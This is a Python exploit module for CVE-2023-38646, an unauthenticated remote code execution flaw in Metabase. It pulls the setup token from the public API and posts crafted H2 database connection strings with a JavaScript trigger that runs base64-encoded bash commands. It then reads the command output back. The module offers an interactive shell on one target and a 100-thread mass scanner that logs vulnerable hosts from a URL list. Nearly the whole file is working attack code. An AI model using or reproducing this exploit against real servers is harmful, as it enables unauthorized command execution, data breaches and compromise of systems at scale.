import re
import os
import json
import base64
import warnings
import requests

from modules.io import *
from core.modular import Module
from urllib.parse import urlparse
from alive_progress import alive_bar
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning


class Exploit(Module):
    """
    Metabase before 0.46.6.1 (Open Source) and 1.46.6.1 (Enterprise) allows attackers to execute arbitrary commands on the server at the server's privilege level. Authentication is not required for exploitation. Other patched versions include 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, and 1.43.7.2.
    This vulnerability allows an attacker to execute arbitrary commands on the Metabase server, potentially leading to unauthorized access, data breaches, or further compromise of the server. It affects Metabase versions prior to the mentioned patched versions.
    """

    def __init__(self):
        """
        Initialize an Exploit object with default attributes.

        The attributes 'name', 'description', 'author', and 'creation_date' are initialized
        with example values for demonstration purposes.
        """
        self.name = "CVE-2023-38646"
        self.description = (
            "RCE in Metabase 0.46.6.1 (Open Source), 1.46.6.1 (Enterprise)."
        )
        self.author = "Chocapikk"
        self.creation_date = "18-11-2023"

        self.url = None
        self.verbose = False
        self.output = None
        self.threads = 100

    def get_token_from_api(self, base_url):
        url = base_url + "/api/session/properties"
        response = requests.get(url, verify=False, timeout=3)
        data = json.loads(response.text)
        token = data.get("setup-token")
        return token

    def send_request(self, base_url, token, command="uname -a"):
        command = f"(echo '[S]';{command};echo '[E]') > /tmp/lol"
        encoded_command = (
            base64.b64encode(f"$( {command} )".encode()).decode().replace("=", "%3D")
        )
        payload = {
            "token": token,
            "details": {
                "details": {
                    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,"
                    + encoded_command
                    + "}|{base64,-d}|{bash,-i}')\n$$--=x",
                    "advanced-options": False,
                },
                "engine": "h2",
            },
        }
        parsed_url = urlparse(base_url)
        headers = {
            "Host": parsed_url.netloc,
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 ",
            "Connection": "close",
        }
        response = requests.post(
            f"{base_url}/api/setup/validate", headers=headers, data=json.dumps(payload)
        )

        json_data = {
            "token": token,
            "details": {
                "details": {
                    "subprotocol": "h2",
                    "classname": "org.h2.Driver",
                    "advanced-options": True,
                    "subname": "mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '/tmp/lol'//\\;",
                },
                "name": "1337_h4x0r",
                "engine": "postgres",
            },
        }

        url = f"{base_url}/api/setup/validate"
        response = requests.post(
            url, headers=headers, json=json_data, verify=False, timeout=3
        )
        return response

    def check_vulnerability(
        self, url, response, verbose, output_file=None, single_url_mode=False
    ):
        match = re.search(r"\[S\](.*?)\[E\]", response.text)
        if match:
            pattern = re.compile(r"\[S\](.*?)\[E\]", re.DOTALL)
            response_content = pattern.search(response.text)
            print_success(f"{url} is vulnerable.") if not single_url_mode else None
            if output_file and not single_url_mode:
                with open(output_file, "a") as file:
                    file.write(url + "\n")
            if verbose or single_url_mode:
                truncated_content = (
                    response_content.group(1)
                    .replace("\\000a", "\n")
                    .replace("\\n", "\n")
                )
                print_status(f"\n{truncated_content}")
            return True

    def check_url(self, url, verbose, output_file, single_url_mode=False):
        token = self.get_token_from_api(url)
        response = self.send_request(url, token)
        if self.check_vulnerability(url, response, verbose, output_file):
            if single_url_mode:
                session = PromptSession(history=InMemoryHistory())
                while True:
                    try:
                        command = session.prompt(HTML("<ansired><b># </b></ansired>"))
                        if "exit" in command:
                            raise KeyboardInterrupt
                        elif not command:
                            continue
                        elif "clear" in command:
                            if os.name == "posix":
                                os.system("clear")
                            elif os.name == "nt":
                                os.system("cls")
                            if command.lower() in ["exit", "quit"]:
                                break
                        response = self.send_request(url, token, command)
                        self.check_vulnerability(
                            url, response, verbose, output_file, single_url_mode=True
                        )
                    except KeyboardInterrupt:
                        print_info("Exiting shell...")
                        return None

    def execute(self):
        warnings.simplefilter("ignore", InsecureRequestWarning)
        mode = input_data(self.name, "Choose mode (url/list)")

        if mode.lower() == "url":
            self.url = input_data(self.name, "Enter the base URL for the requests")

            verbose_input = input_data(self.name, "Enable verbose output? (yes/no)")
            self.verbose = verbose_input.lower() == "yes"

            output_file = input_data(self.name, "Enter the output file path")
            self.output = output_file.strip() if output_file else None

            self.check_url(self.url, self.verbose, self.output, single_url_mode=True)

        elif mode.lower() == "list":
            file_path = input_data(
                self.name, "Enter the file path containing a list of base URLs to scan"
            )

            try:
                with open(file_path, "r") as file:
                    urls = [line.strip() for line in file]
            except (OSError, FileNotFoundError) as e:
                print_error(f"Error opening URL file: {e}.")
                return

            output_file = input_data(self.name, "Enter the output file path")
            self.output = output_file.strip() if output_file else None

            with ThreadPoolExecutor(max_workers=self.threads) as executor, alive_bar(
                len(urls), bar="smooth", enrich_print=False
            ) as bar:
                futures = {
                    executor.submit(self.check_url, url, self.verbose, self.output): url
                    for url in urls
                }
                for future in as_completed(futures):
                    bar()

        else:
            print_error("Invalid mode selected. Please choose 'url' or 'list'.")
